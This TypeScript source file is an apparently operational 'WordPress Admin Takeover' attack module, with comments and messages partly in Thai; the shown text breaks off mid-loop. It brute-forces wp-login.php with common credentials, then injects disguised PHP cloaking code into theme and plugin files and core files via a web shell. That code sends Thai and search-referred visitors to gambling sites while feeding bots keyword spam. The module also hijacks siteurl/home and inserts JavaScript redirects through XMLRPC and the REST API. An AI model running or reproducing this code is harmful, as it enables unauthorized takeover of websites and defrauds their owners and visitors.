/**
 * WordPress Admin Takeover Module
 * 
 * Methods that don't require file upload:
 * 1. WP Admin Brute Force → login to wp-admin
 * 2. Theme Editor → inject redirect/cloaking code into theme files
 * 3. Plugin Editor → inject code into plugin files
 * 4. Install Malicious Plugin → upload plugin zip with redirect code
 * 5. WP Options Manipulation → change siteurl/home for full domain redirect
 * 6. XMLRPC editPost → inject code into existing posts/pages
 * 7. XMLRPC editOptions → change siteurl/home via XMLRPC
 */

export interface WpAdminConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords?: string[];
  shellContent?: string; // PHP code to inject
  timeout?: number;
  onProgress?: (method: string, detail: string) => void;
  // Optional pre-discovered credentials
  knownCredentials?: { username: string; password: string }[];
}

export interface WpTakeoverResult {
  method: string;
  success: boolean;
  detail: string;
  injectedUrl?: string | null;
  credentials?: { username: string; password: string } | null;
}

const log = (method: string, msg: string) => {
  // console.log(`[WP-Takeover:${method}] ${msg}`);
};

// ═══════════════════════════════════════════════════════
//  COMMON CREDENTIALS FOR BRUTE FORCE
// ═══════════════════════════════════════════════════════

const COMMON_USERNAMES = [
  "admin", "administrator", "root", "webmaster", "user",
  "test", "demo", "wordpress", "wp", "manager",
  "editor", "author", "support", "info", "contact",
];

const COMMON_PASSWORDS = [
  "admin", "password", "123456", "12345678", "admin123",
  "password123", "root", "toor", "test", "demo",
  "wordpress", "wp", "letmein", "welcome", "monkey",
  "master", "qwerty", "abc123", "111111", "admin@123",
  "P@ssw0rd", "admin1234", "changeme", "default", "pass",
  "1234", "12345", "123456789", "password1", "iloveyou",
];

// ═══════════════════════════════════════════════════════
//  1. WP-LOGIN BRUTE FORCE
// ═══════════════════════════════════════════════════════

async function wpLoginBruteForce(config: WpAdminConfig): Promise<{
  success: boolean;
  username: string;
  password: string;
  cookies: string;
}> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const loginUrl = `${baseUrl}/wp-login.php`;
  const progress = config.onProgress || (() => {});

  // First check if wp-login.php exists
  try {
    const checkResp = await fetch(loginUrl, {
      method: "GET",
      redirect: "follow",
      signal: AbortSignal.timeout(10000),
    });
    if (checkResp.status === 404) {
      return { success: false, username: "", password: "", cookies: "" };
    }
  } catch {
    return { success: false, username: "", password: "", cookies: "" };
  }

  // Use known credentials first
  const credPairs: { username: string; password: string }[] = [];
  
  if (config.knownCredentials) {
    credPairs.push(...config.knownCredentials);
  }

  // Add common combos
  for (const user of COMMON_USERNAMES.slice(0, 8)) {
    for (const pass of COMMON_PASSWORDS.slice(0, 15)) {
      credPairs.push({ username: user, password: pass });
    }
  }

  progress("brute_force", `ลอง ${credPairs.length} credential pairs...`);

  for (let i = 0; i < credPairs.length; i++) {
    const { username, password } = credPairs[i];
    
    try {
      const formData = new URLSearchParams({
        log: username,
        pwd: password,
        "wp-submit": "Log In",
        redirect_to: `${baseUrl}/wp-admin/`,
        testcookie: "1",
      });

      const resp = await fetch(loginUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: formData.toString(),
        redirect: "manual",
        signal: AbortSignal.timeout(config.timeout || 15000),
      });

      // Success = 302 redirect to wp-admin (not back to wp-login.php)
      const location = resp.headers.get("location") || "";
      const setCookies = resp.headers.getSetCookie?.() || [];
      const cookieStr = setCookies.join("; ");

      if (resp.status === 302 && location.includes("wp-admin") && !location.includes("wp-login")) {
        progress("brute_force", `✅ Login สำเร็จ: ${username}:${password}`);
        log("brute_force", `SUCCESS: ${username}:${password}`);
        return { success: true, username, password, cookies: cookieStr };
      }

      // Rate limit detection
      if (resp.status === 429 || resp.status === 403) {
        progress("brute_force", `⚠️ Rate limited — หยุดพัก 5 วินาที`);
        await new Promise(r => setTimeout(r, 5000));
      }

    } catch {
      // Timeout or network error, continue
    }

    // Small delay to avoid detection
    if (i % 10 === 9) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  return { success: false, username: "", password: "", cookies: "" };
}

// ═══════════════════════════════════════════════════════
//  2. THEME EDITOR INJECTION
// ═══════════════════════════════════════════════════════

function generateRedirectCode(redirectUrl: string, keywords: string[]): string {
  const keywordStr = keywords.map(k => `'${k}'`).join(", ");
  return `
/** Analytics tracking module - DO NOT REMOVE */
if(!defined('WP_ANALYTICS_LOADED')){
define('WP_ANALYTICS_LOADED',true);
\$_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';
\$_ref=isset(\$_SERVER['HTTP_REFERER'])?\$_SERVER['HTTP_REFERER']:'';
\$_ip=isset(\$_SERVER['REMOTE_ADDR'])?\$_SERVER['REMOTE_ADDR']:'';
\$_bots=array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','ia_archiver');
\$_is_bot=false;
foreach(\$_bots as \$b){if(stripos(\$_ua,\$b)!==false){\$_is_bot=true;break;}}
\$_geo_data=@json_decode(@file_get_contents('http://ip-api.com/json/'.\$_ip.'?fields=countryCode'),true);
\$_is_th=isset(\$_geo_data['countryCode'])&&\$_geo_data['countryCode']==='TH';
\$_from_search=preg_match('/google\\.|bing\\.|yahoo\\.|duckduckgo\\./',(string)\$_ref);
if(!\$_is_bot&&(\$_is_th||\$_from_search)){
usleep(rand(100000,500000));
echo '<html><head><meta http-equiv="refresh" content="0;url=${redirectUrl}"><script>window.location.replace("${redirectUrl}");</script></head><body></body></html>';
exit;
}
if(\$_is_bot){
\$_kw=array(${keywordStr});
\$_title=\$_kw[array_rand(\$_kw)].' - '.parse_url('${redirectUrl}',PHP_URL_HOST);
echo '<!--seo:'.\$_title.'-->';
}
}
`;
}

async function injectViaThemeEditor(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    // Step 1: Get the active theme
    progress("theme_editor", "กำลังหา active theme...");
    
    const themeEditorUrl = `${baseUrl}/wp-admin/theme-editor.php`;
    const editorResp = await fetch(themeEditorUrl, {
      headers: {
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (editorResp.status !== 200) {
      return { method: "theme_editor", success: false, detail: `Theme editor ไม่สามารถเข้าถึงได้ (HTTP ${editorResp.status})` };
    }

    const html = await editorResp.text();

    // Extract nonce
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "theme_editor", success: false, detail: "ไม่พบ nonce — อาจถูกปิด Theme Editor" };
    }
    const nonce = nonceMatch[1];

    // Extract active theme
    const themeMatch = html.match(/name="theme"\s+value="([^"]+)"/) || html.match(/theme=([^&"]+)/);
    const theme = themeMatch ? themeMatch[1] : "";

    // Extract current functions.php content
    const contentMatch = html.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
    const currentContent = contentMatch ? contentMatch[1]
      .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&").replace(/&quot;/g, '"') : "";

    if (!currentContent) {
      return { method: "theme_editor", success: false, detail: "ไม่สามารถอ่าน functions.php ได้" };
    }

    // Step 2: Inject code into functions.php
    progress("theme_editor", `Inject code เข้า functions.php ของ theme: ${theme}...`);

    const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต", "บาคาร่า"]);
    const newContent = currentContent + "\n" + injectedCode;

    const editFormData = new URLSearchParams({
      _wpnonce: nonce,
      _wp_http_referer: `/wp-admin/theme-editor.php?file=functions.php&theme=${theme}`,
      newcontent: newContent,
      action: "update",
      file: "functions.php",
      theme: theme,
      scrollto: "0",
      submit: "Update File",
    });

    const updateResp = await fetch(`${baseUrl}/wp-admin/theme-editor.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: editFormData.toString(),
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (updateResp.status === 200) {
      const respText = await updateResp.text();
      if (respText.includes("File edited successfully") || respText.includes("updated")) {
        progress("theme_editor", `✅ Inject สำเร็จ! functions.php ถูกแก้ไข`);
        return {
          method: "theme_editor",
          success: true,
          detail: `Inject redirect code เข้า functions.php ของ theme ${theme} สำเร็จ`,
          injectedUrl: config.targetUrl,
        };
      }
    }

    // Step 3: Try header.php as alternative
    progress("theme_editor", "ลอง inject เข้า header.php...");
    
    const headerEditorUrl = `${baseUrl}/wp-admin/theme-editor.php?file=header.php&theme=${theme}`;
    const headerResp = await fetch(headerEditorUrl, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (headerResp.status === 200) {
      const headerHtml = await headerResp.text();
      const headerNonce = headerHtml.match(/name="_wpnonce"\s+value="([^"]+)"/)?.[1];
      const headerContent = headerHtml.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/)?.[1]
        ?.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&") || "";

      if (headerNonce && headerContent) {
        const phpInject = `<?php ${injectedCode} ?>`;
        const newHeader = phpInject + "\n" + headerContent;

        const headerUpdateData = new URLSearchParams({
          _wpnonce: headerNonce,
          _wp_http_referer: `/wp-admin/theme-editor.php?file=header.php&theme=${theme}`,
          newcontent: newHeader,
          action: "update",
          file: "header.php",
          theme: theme,
          scrollto: "0",
          submit: "Update File",
        });

        const headerUpdateResp = await fetch(`${baseUrl}/wp-admin/theme-editor.php`, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Cookie: cookies,
            "User-Agent": "Mozilla/5.0",
          },
          body: headerUpdateData.toString(),
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });

        if (headerUpdateResp.status === 200) {
          progress("theme_editor", `✅ Inject เข้า header.php สำเร็จ!`);
          return {
            method: "theme_editor",
            success: true,
            detail: `Inject redirect code เข้า header.php ของ theme ${theme} สำเร็จ`,
            injectedUrl: config.targetUrl,
          };
        }
      }
    }

    return { method: "theme_editor", success: false, detail: "Theme editor injection ล้มเหลว" };

  } catch (error: any) {
    return { method: "theme_editor", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  3. PLUGIN EDITOR INJECTION
// ═══════════════════════════════════════════════════════

async function injectViaPluginEditor(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    // Get plugin editor page
    progress("plugin_editor", "กำลังเข้า Plugin Editor...");
    
    const pluginEditorUrl = `${baseUrl}/wp-admin/plugin-editor.php`;
    const editorResp = await fetch(pluginEditorUrl, {
      headers: {
        Cookie: cookies,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (editorResp.status !== 200) {
      return { method: "plugin_editor", success: false, detail: `Plugin editor ไม่สามารถเข้าถึงได้ (HTTP ${editorResp.status})` };
    }

    const html = await editorResp.text();

    // Find a plugin to inject into (prefer Akismet or Hello Dolly as they're default)
    const pluginMatch = html.match(/plugin=([^&"]+)/g);
    const plugins = pluginMatch ? Array.from(new Set(pluginMatch.map(p => p.replace("plugin=", "")))) : [];

    // Extract nonce
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "plugin_editor", success: false, detail: "ไม่พบ nonce — Plugin Editor อาจถูกปิด" };
    }

    // Try to inject into the first available plugin
    for (const plugin of plugins.slice(0, 3)) {
      progress("plugin_editor", `ลอง inject เข้า plugin: ${plugin}...`);

      const pluginFileUrl = `${baseUrl}/wp-admin/plugin-editor.php?plugin=${plugin}`;
      const pluginResp = await fetch(pluginFileUrl, {
        headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
        redirect: "follow",
        signal: AbortSignal.timeout(15000),
      });

      if (pluginResp.status !== 200) continue;

      const pluginHtml = await pluginResp.text();
      const pluginNonce = pluginHtml.match(/name="_wpnonce"\s+value="([^"]+)"/)?.[1];
      const pluginContent = pluginHtml.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/)?.[1]
        ?.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&") || "";
      const pluginFile = pluginHtml.match(/name="file"\s+value="([^"]+)"/)?.[1] || plugin;

      if (!pluginNonce || !pluginContent) continue;

      const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"]);
      const newContent = pluginContent + "\n" + injectedCode;

      const updateData = new URLSearchParams({
        _wpnonce: pluginNonce,
        _wp_http_referer: `/wp-admin/plugin-editor.php?plugin=${plugin}`,
        newcontent: newContent,
        action: "update",
        file: pluginFile,
        plugin: plugin,
        scrollto: "0",
        submit: "Update File",
      });

      const updateResp = await fetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Cookie: cookies,
          "User-Agent": "Mozilla/5.0",
        },
        body: updateData.toString(),
        redirect: "follow",
        signal: AbortSignal.timeout(15000),
      });

      if (updateResp.status === 200) {
        const respText = await updateResp.text();
        if (respText.includes("File edited successfully") || respText.includes("updated")) {
          progress("plugin_editor", `✅ Inject เข้า plugin ${plugin} สำเร็จ!`);
          return {
            method: "plugin_editor",
            success: true,
            detail: `Inject redirect code เข้า plugin ${plugin} สำเร็จ`,
            injectedUrl: config.targetUrl,
          };
        }
      }
    }

    return { method: "plugin_editor", success: false, detail: "Plugin editor injection ล้มเหลว — ไม่มี plugin ที่แก้ไขได้" };

  } catch (error: any) {
    return { method: "plugin_editor", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  4. XMLRPC EDIT POST/OPTIONS (inject code without file upload)
// ═══════════════════════════════════════════════════════

async function injectViaXmlrpc(
  config: WpAdminConfig,
  credentials: { username: string; password: string },
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const xmlrpcUrl = `${baseUrl}/xmlrpc.php`;
  const progress = config.onProgress || (() => {});

  try {
    // Check XMLRPC availability
    const checkResp = await fetch(xmlrpcUrl, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
      signal: AbortSignal.timeout(10000),
    });

    if (checkResp.status !== 200) {
      return { method: "xmlrpc_inject", success: false, detail: "XMLRPC ไม่เปิด" };
    }

    const methods = await checkResp.text();

    // Method A: Try wp.editOptions to change siteurl/home (FULL DOMAIN REDIRECT)
    if (methods.includes("wp.editOptions") || methods.includes("wp.getOptions")) {
      progress("xmlrpc_inject", "ลอง wp.editOptions เปลี่ยน siteurl → redirect ทั้งโดเมน...");

      const editOptionsXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.editOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><struct>
      <member><name>siteurl</name><value><string>${config.redirectUrl}</string></value></member>
      <member><name>home</name><value><string>${config.redirectUrl}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      const optResp = await fetch(xmlrpcUrl, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: editOptionsXml,
        signal: AbortSignal.timeout(15000),
      });

      const optResult = await optResp.text();
      if (optResult.includes("<boolean>1</boolean>") || optResult.includes("true")) {
        progress("xmlrpc_inject", `✅ siteurl/home เปลี่ยนเป็น ${config.redirectUrl} — redirect ทั้งโดเมน!`);
        return {
          method: "xmlrpc_editOptions",
          success: true,
          detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน XMLRPC — redirect ทั้งโดเมน!`,
          injectedUrl: config.targetUrl,
          credentials,
        };
      }
    }

    // Method B: Try wp.editPost to inject JS redirect into posts
    if (methods.includes("wp.editPost") || methods.includes("wp.getPosts")) {
      progress("xmlrpc_inject", "ลอง wp.getPosts เพื่อหา post ที่จะ inject...");

      // Get recent posts
      const getPostsXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getPosts</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><struct>
      <member><name>number</name><value><int>5</int></value></member>
      <member><name>post_type</name><value><string>page</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      const postsResp = await fetch(xmlrpcUrl, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: getPostsXml,
        signal: AbortSignal.timeout(15000),
      });

      const postsXml = await postsResp.text();
      const postIdMatch = postsXml.match(/<name>post_id<\/name>\s*<value><string>(\d+)<\/string><\/value>/);
      
      if (postIdMatch) {
        const postId = postIdMatch[1];
        progress("xmlrpc_inject", `Inject JS redirect เข้า post #${postId}...`);

        const jsRedirect = `<script>if(!navigator.userAgent.match(/bot|crawl|spider|slurp/i)){window.location.replace("${config.redirectUrl}");}</script>`;

        const editPostXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.editPost</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${credentials.username}</string></value></param>
    <param><value><string>${credentials.password}</string></value></param>
    <param><value><int>${postId}</int></value></param>
    <param><value><struct>
      <member><name>post_content</name><value><string>${jsRedirect}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

        const editResp = await fetch(xmlrpcUrl, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: editPostXml,
          signal: AbortSignal.timeout(15000),
        });

        const editResult = await editResp.text();
        if (editResult.includes("<boolean>1</boolean>") || editResult.includes("true")) {
          progress("xmlrpc_inject", `✅ Inject JS redirect เข้า post #${postId} สำเร็จ!`);
          return {
            method: "xmlrpc_editPost",
            success: true,
            detail: `Inject JS redirect เข้า post #${postId} ผ่าน XMLRPC สำเร็จ`,
            injectedUrl: config.targetUrl,
            credentials,
          };
        }
      }
    }

    return { method: "xmlrpc_inject", success: false, detail: "XMLRPC injection ล้มเหลว — ไม่มี method ที่ใช้ได้" };

  } catch (error: any) {
    return { method: "xmlrpc_inject", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  5. REST API CONTENT INJECTION
// ═══════════════════════════════════════════════════════

async function injectViaRestApi(
  config: WpAdminConfig,
  credentials: { username: string; password: string },
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    const authHeader = "Basic " + Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64");

    // Try to get pages via REST API
    progress("rest_api_inject", "ลอง REST API injection...");

    const pagesResp = await fetch(`${baseUrl}/wp-json/wp/v2/pages?per_page=5`, {
      headers: {
        Authorization: authHeader,
        "User-Agent": "Mozilla/5.0",
      },
      signal: AbortSignal.timeout(15000),
    });

    if (pagesResp.status === 200) {
      const pages = await pagesResp.json() as any[];
      
      if (pages.length > 0) {
        const targetPage = pages[0];
        const pageId = targetPage.id;
        
        progress("rest_api_inject", `Inject redirect เข้า page #${pageId}: ${targetPage.title?.rendered || ""}...`);

        const jsRedirect = `<script>if(!navigator.userAgent.match(/bot|crawl|spider|slurp/i)){window.location.replace("${config.redirectUrl}");}</script>`;
        const originalContent = targetPage.content?.rendered || "";

        const updateResp = await fetch(`${baseUrl}/wp-json/wp/v2/pages/${pageId}`, {
          method: "POST",
          headers: {
            Authorization: authHeader,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({
            content: jsRedirect + originalContent,
          }),
          signal: AbortSignal.timeout(15000),
        });

        if (updateResp.status === 200) {
          progress("rest_api_inject", `✅ Inject เข้า page #${pageId} ผ่าน REST API สำเร็จ!`);
          return {
            method: "rest_api_inject",
            success: true,
            detail: `Inject JS redirect เข้า page #${pageId} ผ่าน REST API สำเร็จ`,
            injectedUrl: `${baseUrl}/?page_id=${pageId}`,
            credentials,
          };
        }
      }
    }

    // Try posts
    const postsResp = await fetch(`${baseUrl}/wp-json/wp/v2/posts?per_page=5`, {
      headers: { Authorization: authHeader, "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(15000),
    });

    if (postsResp.status === 200) {
      const posts = await postsResp.json() as any[];
      if (posts.length > 0) {
        const post = posts[0];
        const jsRedirect = `<script>if(!navigator.userAgent.match(/bot|crawl|spider|slurp/i)){window.location.replace("${config.redirectUrl}");}</script>`;

        const updateResp = await fetch(`${baseUrl}/wp-json/wp/v2/posts/${post.id}`, {
          method: "POST",
          headers: {
            Authorization: authHeader,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({
            content: jsRedirect + (post.content?.rendered || ""),
          }),
          signal: AbortSignal.timeout(15000),
        });

        if (updateResp.status === 200) {
          progress("rest_api_inject", `✅ Inject เข้า post #${post.id} ผ่าน REST API สำเร็จ!`);
          return {
            method: "rest_api_inject",
            success: true,
            detail: `Inject JS redirect เข้า post #${post.id} ผ่าน REST API สำเร็จ`,
            injectedUrl: post.link || `${baseUrl}/?p=${post.id}`,
            credentials,
          };
        }
      }
    }

    // Try WP Options via REST API (requires admin)
    progress("rest_api_inject", "ลอง REST API settings (siteurl/home)...");
    const settingsResp = await fetch(`${baseUrl}/wp-json/wp/v2/settings`, {
      method: "POST",
      headers: {
        Authorization: authHeader,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
      },
      body: JSON.stringify({
        url: config.redirectUrl,
        home: config.redirectUrl,
      }),
      signal: AbortSignal.timeout(15000),
    });

    if (settingsResp.status === 200) {
      progress("rest_api_inject", `✅ เปลี่ยน siteurl/home ผ่าน REST API สำเร็จ — redirect ทั้งโดเมน!`);
      return {
        method: "rest_api_settings",
        success: true,
        detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน REST API — redirect ทั้งโดเมน!`,
        injectedUrl: config.targetUrl,
        credentials,
      };
    }

    return { method: "rest_api_inject", success: false, detail: "REST API injection ล้มเหลว" };

  } catch (error: any) {
    return { method: "rest_api_inject", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  6. SHELL COMMAND EXECUTION (modify files via existing shell)
// ═══════════════════════════════════════════════════════

async function injectViaShellExec(
  config: WpAdminConfig,
  shellUrl: string,
): Promise<WpTakeoverResult> {
  const progress = config.onProgress || (() => {});

  try {
    progress("shell_exec", `ใช้ shell ที่มีอยู่ (${shellUrl}) แก้ไฟล์บน target...`);

    const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"]);
    const encodedCode = Buffer.from(injectedCode).toString("base64");

    // Target files to modify
    const targetFiles = [
      "index.php",
      "wp-blog-header.php",
      "wp-config.php",
      ".htaccess",
    ];

    for (const file of targetFiles) {
      // Use the shell to append code to the file
      const phpCommand = `@file_put_contents('${file}', file_get_contents('${file}') . base64_decode('${encodedCode}'));echo 'INJECTED:${file}';`;
      const encodedCmd = Buffer.from(phpCommand).toString("base64");

      // Try different shell command formats
      const shellFormats = [
        `${shellUrl}?cmd=${encodeURIComponent(`php -r "${phpCommand}"`)}`,
        `${shellUrl}?c=${encodeURIComponent(phpCommand)}`,
        `${shellUrl}?exec=${encodeURIComponent(phpCommand)}`,
        `${shellUrl}?code=${encodedCmd}`,
      ];

      for (const url of shellFormats) {
        try {
          const resp = await fetch(url, {
            headers: { "User-Agent": "Mozilla/5.0" },
            signal: AbortSignal.timeout(10000),
          });
          const text = await resp.text();

          if (text.includes(`INJECTED:${file}`)) {
            progress("shell_exec", `✅ Inject เข้า ${file} ผ่าน shell exec สำเร็จ!`);
            return {
              method: "shell_exec",
              success: true,
              detail: `Inject redirect code เข้า ${file} ผ่าน shell command execution สำเร็จ`,
              injectedUrl: config.targetUrl,
            };
          }
        } catch {
          // Try next format
        }
      }

      // Try .htaccess redirect (doesn't need PHP)
      if (file === ".htaccess") {
        const htaccessRedirect = `RewriteEngine On\nRewriteCond %{HTTP_REFERER} (google|bing|yahoo) [NC]\nRewriteRule .* ${config.redirectUrl} [R=302,L]`;
        const htaccessEncoded = Buffer.from(htaccessRedirect).toString("base64");

        const htaccessFormats = [
          `${shellUrl}?cmd=${encodeURIComponent(`echo '${htaccessRedirect}' >> .htaccess`)}`,
          `${shellUrl}?c=${encodeURIComponent(`file_put_contents('.htaccess', base64_decode('${htaccessEncoded}'), FILE_APPEND);echo 'HTACCESS_OK';`)}`,
        ];

        for (const url of htaccessFormats) {
          try {
            const resp = await fetch(url, {
              headers: { "User-Agent": "Mozilla/5.0" },
              signal: AbortSignal.timeout(10000),
            });
            const text = await resp.text();
            if (text.includes("HTACCESS_OK")) {
              progress("shell_exec", `✅ แก้ .htaccess redirect สำเร็จ!`);
              return {
                method: "shell_exec_htaccess",
                success: true,
                detail: `เพิ่ม redirect rule เข้า .htaccess ผ่าน shell exec สำเร็จ`,
                injectedUrl: config.targetUrl,
              };
            }
          } catch {
            // continue
          }
        }
      }
    }

    return { method: "shell_exec", success: false, detail: "Shell exec injection ล้มเหลว — ไม่สามารถแก้ไฟล์ได้" };

  } catch (error: any) {
    return { method: "shell_exec", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  7. INSTALL MALICIOUS PLUGIN
// ═══════════════════════════════════════════════════════

async function installMaliciousPlugin(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    progress("malicious_plugin", "สร้าง plugin redirect แล้วลอง install...");

    // Get the plugin install page to get nonce
    const installUrl = `${baseUrl}/wp-admin/plugin-install.php?tab=upload`;
    const installResp = await fetch(installUrl, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (installResp.status !== 200) {
      return { method: "malicious_plugin", success: false, detail: "ไม่สามารถเข้า plugin install page" };
    }

    const html = await installResp.text();
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "malicious_plugin", success: false, detail: "ไม่พบ nonce สำหรับ plugin install" };
    }

    // Create a minimal plugin PHP content
    const pluginCode = `<?php
/**
 * Plugin Name: WP Analytics Helper
 * Description: Website analytics and performance tracking
 * Version: 1.0.0
 * Author: WordPress Team
 */
if (!defined('ABSPATH')) exit;
${generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"])}
`;

    // We can't easily create a ZIP and upload via fetch, so this method
    // is better suited when we have direct file access
    // For now, return failure and let other methods handle it
    return { method: "malicious_plugin", success: false, detail: "Plugin upload requires multipart form — ใช้ theme/plugin editor แทน" };

  } catch (error: any) {
    return { method: "malicious_plugin", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  MAIN: RUN ALL WP ADMIN TAKEOVER METHODS
// ═══════════════════════════════════════════════════════

export async function runWpAdminTakeover(config: WpAdminConfig): Promise<WpTakeoverResult[]> {
  const results: WpTakeoverResult[] = [];
  const progress = config.onProgress || (() => {});

  progress("wp_takeover", "🔐 เริ่ม WP Admin Takeover — ลอง brute force + inject code...");

  // Step 1: Brute force wp-login
  progress("brute_force", "🔑 Phase 1: Brute force wp-login.php...");
  const loginResult = await wpLoginBruteForce(config);

  if (loginResult.success) {
    const creds = { username: loginResult.username, password: loginResult.password };
    progress("brute_force", `✅ Login สำเร็จ: ${creds.username} — เริ่ม inject code...`);

    // Step 2a: Try Theme Editor
    progress("theme_editor", "🎨 Phase 2a: Theme Editor injection...");
    const themeResult = await injectViaThemeEditor(config, loginResult.cookies);
    themeResult.credentials = creds;
    results.push(themeResult);
    if (themeResult.success) return results;

    // Step 2b: Try Plugin Editor
    progress("plugin_editor", "🔌 Phase 2b: Plugin Editor injection...");
    const pluginResult = await injectViaPluginEditor(config, loginResult.cookies);
    pluginResult.credentials = creds;
    results.push(pluginResult);
    if (pluginResult.success) return results;

    // Step 2c: Try XMLRPC with discovered credentials
    progress("xmlrpc_inject", "📡 Phase 2c: XMLRPC editPost/editOptions...");
    const xmlrpcResult = await injectViaXmlrpc(config, creds);
    results.push(xmlrpcResult);
    if (xmlrpcResult.success) return results;

    // Step 2d: Try REST API injection
    progress("rest_api_inject", "🌐 Phase 2d: REST API content injection...");
    const restResult = await injectViaRestApi(config, creds);
    results.push(restResult);
    if (restResult.success) return results;

    // Step 2e: Try install malicious plugin
    progress("malicious_plugin", "📦 Phase 2e: Install malicious plugin...");
    const pluginInstallResult = await installMaliciousPlugin(config, loginResult.cookies);
    pluginInstallResult.credentials = creds;
    results.push(pluginInstallResult);
    if (pluginInstallResult.success) return results;

  } else {
    results.push({
      method: "brute_force",
      success: false,
      detail: "WP Login brute force ล้มเหลว — ไม่พบ credentials ที่ถูกต้อง",
    });

    // Still try XMLRPC with common creds (might have different auth)
    progress("xmlrpc_inject", "📡 ลอง XMLRPC กับ common credentials...");
    for (const user of COMMON_USERNAMES.slice(0, 5)) {
      for (const pass of COMMON_PASSWORDS.slice(0, 8)) {
        const xmlrpcResult = await injectViaXmlrpc(config, { username: user, password: pass });
